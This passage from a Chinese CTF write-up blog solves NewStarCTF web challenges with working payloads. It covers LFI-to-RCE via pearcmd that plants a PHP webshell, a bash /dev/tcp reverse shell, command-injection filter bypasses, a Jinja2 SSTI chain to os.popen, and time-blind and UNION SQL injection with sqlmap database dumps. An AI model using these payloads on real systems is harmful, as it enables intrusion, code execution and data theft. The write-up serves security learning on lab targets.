<p>然后再次验证，得到flag：<code>flag&#123;Ju3t_use_mo2e_t2en_0ne_SQL&#125;</code> </p>
</li>
<li><p>发现了神奇的问题，删除记录的时候，只有 <code>username, listen</code> 两个字段是有效的，<code>write, read</code> 完全没用！在本地sql上测试发现使用这两个字段名会报错；猜测是因为他俩本身是保留字，新建另一张表，字段名对应改为 <code>readn, writen</code> ，发现可以使用这两个字段进行删除操作！说明保留字的猜测是正确的。</p>
</li>
<li><p>看了wp才意识到自己忘了题目，题目上写着希望帮火华师傅改成绩通过学校验证，因此拿到flag的方式就是修改记录；而自己的思路主要是寻找数据库中的flag并放入可以查询的数据表中，或是通过改写服务器上的php文件来写入木马，从而得到后门，找到存在服务器中的flag。</p>
</li>
</ul>
<h3 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h3><p>LFI代表php本地文件 包含漏洞，RCE代表远程代码执行漏洞。</p>
<p>因此 <code>RCE via LFI</code> 表示依赖LFI实现的RCE</p>
<p>参考：<a class="link"   href="https://zhuanlan.zhihu.com/p/50445145" >PHP本地文件包含漏洞笔记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://tttang.com/archive/1395/" >The End Of LFI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://gitbook-88.gitbook.io/ctf-writeup/2022/2022-newstarctf/week3-includetwo" >[WEEK3]IncludeTwo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><ul>
<li><pre><code>file=index
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">会产生递归调用的效果，不断出现新的index代码，当加上空字符就无效：</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
file=index%00
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">猜测可以实现00截断，PHP版本低于5.3.4，但是尝试了</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
?file=index.php%00
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  发现并没有读取到&quot;index.php&quot;，因此还是不能做到截断的。</span><br><span class="line">  </span><br><span class="line">* 翻了好久的&quot;LFI via RCE&quot;，在P佬的 [Docker PHP裸文件本地包含综述](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) 中找到了可行的思路，利用Dcoker中自动安装的&quot;/usr/local/lib/pearcmd.php&quot;文件与Docker环境下自动开启的&quot;register_argc_argv&quot;配置，用请求传入CLI，访问PHP扩展管理工具&quot;pecl&quot;来实现任意文件写。</span><br><span class="line"></span><br><span class="line">  pecl中有一个命令是 `config-create contents filePath` ，它可以在权限范围内将&quot;contents&quot;写入指定路径的文件中。</span><br><span class="line"></span><br><span class="line">  能成功写入文件的payload：</span><br><span class="line"></span><br><span class="line">  ```php</span><br><span class="line">  ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

写入成功后CLI的回显也会相应打回前端。接着访问&quot;/tmp/hello.php&quot;：

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?file=/tmp/hello</span><br><span class="line"></span><br><span class="line">-&gt;<span class="comment">#PEAR_Config 0.9 a:12:&#123;s:7:&quot;php_dir&quot;;s:62:&quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/php&quot;;s:8:&quot;data_dir&quot;;s:63:&quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?...</span></span><br></pre></td></tr></table></figure></div>

会发现 `phpinfo()` 并没有成功执行。一开始没意识到是为什么，查询了wp后发现是因为发送HTTP请求时，尖括号进行了URL编码。由于argv将直接读取传入的内容作为CLI参数，因此被URL编码的尖括号并未被URL解码就作为参数传给了pecl工具，于是写入文件的就从 `&lt;?=phpinfo()?&gt;` 变成了 `%3C?=phpinfo()?%3E` ，因此php命令就失效了，这个在访问hello.php时其实可以看得出来（虽然没意识到是这么一回事）。由于在发送HTTP请求时，不论是什么shell都会进行URL编码，因此切换工具是不行的（包括但不限于Python的request库，浏览器，hackbar，curl），只能用burp抓取已经发送的包进行修改，还原被URL编码的字符再发送才能成功。

最后getshell的payload：

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=@eval($_GET[%27shell%27])?%3E+/tmp/shell.php</span><br><span class="line"></span><br><span class="line">?file=/tmp/shell&amp;shell=system(&#x27;cat /f*&#x27;);</span><br><span class="line"></span><br><span class="line">-&gt;flag&#123;8438c22d-d66c-4fc3-848e-4677ac90d5d7&#125;</span><br></pre></td></tr></table></figure></div>

 使用burp的&quot;url-decode&quot;时，原本的&quot;+&quot;会被解码成某种空白字符，它会导致请求400；太久没写php了，忘记执行函数要套上 `system()` ，还捣鼓了半天（=\_=），这里也可以反弹shell：`?file=/tmp/shell&amp;shell=system(&#39;bash -c &quot;bash -i &gt;%26 /dev/tcp/ip/port 0&gt;&amp;261&quot;&#39;);` 。受到之前url编码的影响，我以为反弹shell的时候也要避开url编码，却发现这样的话 `&amp;` 符号就不知如何处理，但实际上这个参数由php接收，它是会被url解码的，因此不需要考虑特殊字符的问题，同时 `$_GET` 与 `$_POST` 也都是可以的。 

对于 `&amp;` 字符，它除了被URL编码之外，都将被识别为不同参数的分界符，这是由URL的语法分析原则决定的。
</code></pre>
</li>
<li><p>关于P神的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+&amp;file=/usr/local/lib/php/pearcmd+&amp;/&lt;?=phpinfo();?&gt;+/tmp/pinfo.php</span><br><span class="line"></span><br><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

<p>上方的payload不能成功写入文件，这是我一开始写的，下方的是P神的payload，因此我突然发现P神的payload很有意思。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">RFC3875中规定，如果query-string中不包含没有编码的=，且请求是GET或HEAD，则query-string需要被作为命令行参数。</span><br><span class="line">PHP中即使我们传入的query-string包含等号，也仍会被赋值给$_SERVER[&#x27;argv&#x27;]</span><br></pre></td></tr></table></figure></div>

<p>传入的请求参数若不赋予其值，则会被当做命令行参数处理，前提是开启了 <code>register_argc_argv</code> 选项。因此实际执行的命令是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+config-create+/file/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

<p><code>+</code> 代替空格。相当于往 <code>/tmp/hello.php</code> 文件中写入了  <code>/file/&lt;?=phpinfo()?&gt;</code> 内容。其中 <code>&lt;?=</code> 是标签 <code>&lt;?php echo</code> 的简写，即写入了 <code>&lt;?php echo phpinfo()?&gt;</code> ，可以没有分号，语句也能正常执行。</p>
<hr>
<p>开头的空格</p>
<p>开一个Docker的PHP环境来测试：</p>
</li>
</ul>
<h3 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">17</span>:<span class="string">&quot;first\second\user&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;456&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>php调用父类构造方法：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br></pre></td></tr></table></figure></div>

<p>网上找的EXP跑不了，直接看了WP，发现人家的EXP也是来自网上</p>
<p>有用的：<a class="link"   href="https://blog.csdn.net/mochu7777777/article/details/127152796" >WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>， <a class="link"   href="https://www.freebuf.com/vuls/263977.html" >EXP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>实际上该EXP本身就需要请求参数来作为RCE的参数。调用链条的最后来到Request.php中的 <code>param</code> 函数，此处调用了 <code>input()</code> 函数，并选取 <code>$this-&gt;param</code> 作为最终回调函数的参数，也就是说任意Request类的该参数是RCE的参数。该参数实际上是请求中以GET方式传入的首个任意内容，如：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">?a=id</span><br><span class="line">?id=ls</span><br><span class="line">?k=pwd&amp;ac=ls	// 执行pwd</span><br></pre></td></tr></table></figure></div>

<p>但 <code>?=id</code> 不行</p>
<h4 id="PHP函数："><a href="#PHP函数：" class="headerlink" title="PHP函数："></a>PHP函数：</h4><p><code>explode(&quot; &quot;, &quot;a b cd e&quot;)</code> ：Break a string into an array &#x3D;&gt; <code>[a, b, cd, e]</code></p>
<hr>
<p>最终flag在环境变量中：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line">=&gt; flag&#123;3de1b876-591e-46bf-b4b7-b239a6995f05&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="WEB-Week4"><a href="#WEB-Week4" class="headerlink" title="WEB-Week4"></a>WEB-Week4</h2><h3 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h3><p><a class="link"   href="https://blog.csdn.net/qq_41315957/article/details/118855865" >RCE姿势 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h4><p><code>et</code> ：<a class="link"   href="https://blog.csdn.net/yhj_911/article/details/125302051" >Linux下打开WPS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>base</code> ：<a class="link"   href="https://www.cnblogs.com/JasonCeng/p/15741335.html" >base64 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">?cmd=cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26ls</span><br><span class="line"></span><br><span class="line">=&gt;bin boot dev etc ffffllllaaaaggggg home lib lib64 media mnt opt proc root run sbin srv start.<span class="property">sh</span> sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">?cmd=cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26ca$9t%09fff??<span class="function"><span class="params">lllaaaaggggg</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">=&gt;</span> flag&#123;8585f43d-3a99-407a-af1f-64fcdbdf600d&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>过滤了”fl”与”*“，用通配符”?”绕过；</li>
<li>空格用 <code>%09</code> 或 <code>\$&#123;IFS&#125;</code> 或 <code>\$IFS\$9</code> </li>
<li>过滤字符用空字符连接绕过，<code>$9</code> 未被定义自动为空，连接在cat中间依然表示cat</li>
<li>根目录 <code>/</code> 被过滤用 <code>cd ..</code> 绕过</li>
<li><code>;</code> 被过滤，多命令顺序执行用 <code>&amp;&amp;</code> 绕过</li>
</ol>
<h3 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h3><p><a class="link"   href="https://zhuanlan.zhihu.com/p/98788776" >Django入门 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><em>也许最简单的初始方法是通过注入模板表达式中常用的特殊字符序列来使模板模糊，例如 <code>$&#123;&#123;<%[%'"&#125;&#125;%\</code>。如果引发异常，则表明服务器可能以某种方式解释了注入的模板语法。这表明服务器端模板注入可能存在漏洞。</em></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">3</span>].__name__&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>枚举子类名称，过滤了双引号用单引号替代</p>
<p><code>a.__getattr__(&quot;b&quot;) == a.b == getattr(&quot;b&quot;)</code> </p>
<p><code>a.__sub__(4) == a[4]</code> </p>
<p><code>a.__class__ == a[&quot;__class__&quot;]</code> 目前只有在flask模板注入时发现该语句，在本地测试中py2与py3都不支持该语法，这更像是Js的对象读取。</p>
<p>利用burp爆破枚举子类，寻找有用的类，最终得到os函数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27popen%<span class="number">27</span>).__name__&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>在子类中找到了”Quitter”，获取其构造函数后利用 <code>__globals__</code> 读取函数所在文件对应全局变量的值，读取时发现 <code>__builtins__</code> 中存在 <code>__import__</code> ，获取到该函数并导入 <code>os</code> 。由于 <code>system</code> 被过滤，利用模板渲染时python的语法解析特点，获取到system函数并实现RCE，但是 <code>system</code> 函数无法获取cmd返回值，且反弹shell由于存在空格惨遭过滤，因此改用 <code>os.popen().read()</code> 函数执行RCE：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27os%<span class="number">27</span>)[%27POPEN%<span class="number">27.</span>lower()](%27more%09/%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; app <span class="built_in">bin</span> boot dev etc flag_in_h3r3_52daad home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure></div>

<p>过滤的空格用 <code>%09</code> 或 <code>$&#123;IFS&#125;</code> 或 <code>$IFS$9</code> 绕过，cat被过滤用nl或more</p>
<p>爬取源码app.py：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template </span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;CTFer&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.findall(<span class="string">&#x27;class|init|mro|subclasses|flag|cat|env|&quot;|eval|system|popen|globals|builtins|\+| |attr|\~&#x27;</span>, name): </span><br><span class="line">        t = Template(<span class="string">&quot;Welcome to NewStarCTF Again, Dear &quot;</span> + name + <span class="string">&quot;Try to GET me a NAME&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> t.render() </span><br><span class="line">    <span class="keyword">else</span>: t = Template(<span class="string">&quot;Get Out!Hacker!&quot;</span>) </span><br><span class="line">    <span class="keyword">return</span> t.render() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>

<p>“flag”惨遭过滤，用base64编码绕过：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">❯ <span class="built_in">echo</span> <span class="string">&quot;cat /flag_in_h3r3_52daad&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg==</span><br></pre></td></tr></table></figure></div>

<p>payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">`<span class="built_in">echo</span> \&#x27;Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg==\&#x27; | <span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure></div>

<p>得到EXP：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27os%<span class="number">27</span>)[%27POPEN%<span class="number">27.</span>lower()](%<span class="number">27</span>%60echo$&#123;IFS&#125;%5C%27Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg%3D%3D%5C%<span class="number">27</span>$&#123;IFS&#125;%7C$&#123;IFS&#125;base64$&#123;IFS&#125;-d%<span class="number">60</span>%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; flag&#123;48a07e3e-0a4b-444a-<span class="number">8010</span>-8de01a894d64&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于之前忽略了 <code>/</code> 导致以为通配符不行。实际上payload：<code>tail$&#123;IFS&#125;/fla*</code> 也可以，支持通配符</p>
<h3 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h3><h4 id="Insert注入"><a href="#Insert注入" class="headerlink" title="Insert注入"></a>Insert注入</h4><p>经测试可以使用 <a class="link"   href="https://blog.csdn.net/Bossfrank/article/details/131337894" >Insert注入与Sqlmap的Post注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>pyaload；</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">794</span><span class="string">&#x27; and if(ascii(substr(database(), 1, 1))&gt;65, sleep(4), 1) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>此处的and改成or会注入失败，可能是or后的语句没执行。该payload放在 <code>say.php</code> 中的任意一个框中提交都能注入成功，利用时间盲注即可获得数据库信息。</p>
<hr>
<p>手注太麻烦，试着用sqlmap来自动注入，由于此处是一个POST注入，可以使用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81/say.php --data=<span class="string">&quot;user=1&amp;name=1&amp;comment=1&quot;</span> -p <span class="string">&quot;user&quot;</span> --current-db --technique T --delay=0.1 --time-sec 3 --level=3 --risk=2</span><br></pre></td></tr></table></figure></div>

<p>​		<code>-u</code> 指定目标url，<code>--data</code> 指定post内容，<code>-p</code> 指定注入参数，<code>--current-db</code> 指定获取当前数据库信息，<code>--technique T</code> 指定使用时间盲注，<code>--delay=0.1</code> 指定发包间隔为0.1s，<code>time-sec 3</code> 指定时间盲注的延迟时间为3s，<code>--level=3</code> 指定注入等级为3，<code>--risk=2</code> 指定风险等级为2（高风险等级可以使用更具破坏性的payload，如与Update、Delete有关的），但是这个payload不论如何调整都注不出结果。<em>这可能是因为sqlmap的直接Post注入会漏掉一些请求</em>（补充：实际上是因为没加UA），结合Burp的包来注入能解决这个问题。</p>
<p>​		使用Burp抓取Post请求包并保存为Txt文本文件：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/say.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81/say.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">user</span>=<span class="number">123</span>&amp;name=<span class="number">123</span>&amp;comment=<span class="number">123</span></span></span><br></pre></td></tr></table></figure></div>

<p>使用 <code>-r</code> 参数指定sqlmap从文件中获取Http请求，payload如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r package.txt --dbs</span><br></pre></td></tr></table></figure></div>

<p>sqlmap会确定如下注入点：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Parameter: name (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: user=123&amp;name=123<span class="string">&#x27; AND (SELECT 8459 FROM (SELECT(SLEEP(5)))lyAw) AND &#x27;</span>FPWb<span class="string">&#x27;=&#x27;</span>FPWb&amp;comment=123</span><br></pre></td></tr></table></figure></div>

<p><code>--dbs</code> 获取目标所有数据库名称，能够得到如下信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">web application technology: OpenResty</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">...</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] wfy</span><br><span class="line">fetched data logged to text files under <span class="string">&#x27;/home/sam/.local/share/sqlmap/output/fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到四个数据库名称，依据newstar惯例，尝试获取wfy数据库的信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1</span><br><span class="line"></span><br><span class="line">-&gt; </span><br><span class="line">Database: wfy</span><br><span class="line">[3 tables]</span><br><span class="line">+-----------------+</span><br><span class="line">| wfy_admin       |</span><br><span class="line">| wfy_comments    |</span><br><span class="line">| wfy_information |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure></div>

<p>查看表 <code>wfy_comments</code> 的字段内容：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1 -T wfy_comments --columns</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">Database: wfy</span><br><span class="line">Table: wfy_comments</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+--------------+</span><br><span class="line">| Column  | Type         |</span><br><span class="line">+---------+--------------+</span><br><span class="line">| name    | varchar(255) |</span><br><span class="line">| text    | text         |</span><br><span class="line">| user    | varchar(255) |</span><br><span class="line">| display | tinyint(1)   |</span><br><span class="line">| <span class="built_in">id</span>      | int(11)      |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure></div>

<p>依据提示，flag应该藏在text中，且在 <code>user=f1ag_is_here</code> 处，dump表内容：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1 -T wfy_comments -C text --dump --<span class="built_in">where</span> <span class="string">&#x27;user=&quot;f1ag_is_here&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| text                           |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| flag&#123;We_0nly_have_2wo_choices&#125; |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>来自大佬WP的payload2：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#爆表名</span><br><span class="line">name<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(table_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.tables<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_schema<span class="operator">=</span>database()),<span class="number">2</span>;</span><br><span class="line">#爆列名</span><br><span class="line">name<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(column_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.columns<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_name<span class="operator">=</span><span class="string">&#x27;wfy_comments&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"># 爆字段</span><br><span class="line"><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(id,text,<span class="keyword">user</span>,name,display)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b0,<span class="number">1</span>),<span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

